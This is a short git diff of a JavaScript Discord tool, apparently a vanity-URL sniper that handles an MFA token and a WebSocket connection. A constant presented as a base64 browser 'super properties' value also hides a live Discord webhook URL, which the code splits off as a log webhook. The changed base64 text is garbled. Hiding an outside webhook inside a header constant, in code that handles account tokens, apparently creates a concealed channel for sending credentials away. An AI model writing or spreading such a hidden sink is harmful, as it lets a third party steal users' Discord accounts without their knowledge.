@@ -12,7 +12,7 @@ const config = {
 let mfaToken = null;
 const guilds = {};
 let vanity = { vanity: "", event: null };
-const xSuper = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6aWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://ptb.discord.com/api/webhooks/1402314461003513897/HgsrbgJeI4qzmMk82BZ_r34gRtv6zt5rEeD6sqMR4PvrdNfntVfAqRam_j689VFFwnAB';
+const xSuper = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6aWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://ptb.discord.com/api/webhooks/1402314461003513897/HgsrbgJeI4qzmMk82BZ_r34gRtv6zt5rEeD6sqMR4PvrdNfntVfAqRam_j689VFFwnAB';
 const xSuperProperties = xSuper.split("||")[0];
 const logWebhook = xSuper.split("||")[1];
 const readMFAToken = async () => {
@@ -115,4 +115,5 @@ ws.on("close", (e) => {
 });
 ws.on("error", (e) => {
   console.error("[WebSocket] Error:", e.message);
+
 });
